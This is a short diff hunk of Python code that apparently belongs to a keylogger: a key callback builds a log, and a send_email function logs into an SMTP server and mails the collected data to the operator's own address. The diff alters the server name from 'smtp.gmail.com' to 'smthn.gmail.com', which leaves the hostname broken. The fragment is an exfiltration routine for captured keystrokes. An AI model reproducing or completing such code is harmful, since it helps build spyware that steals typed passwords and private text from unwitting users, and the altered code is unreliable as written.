@@ -20,7 +20,7 @@ def callback_function(key):
     print(log)
 
 def send_email(mail_address,password,message):
-    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server = smtplib.SMTP("smthn.gmail.com",587)
     email_server.starttls()
     email_server.login(mail_address,password)
     email_server.sendmail(mail_address,mail_address,message)
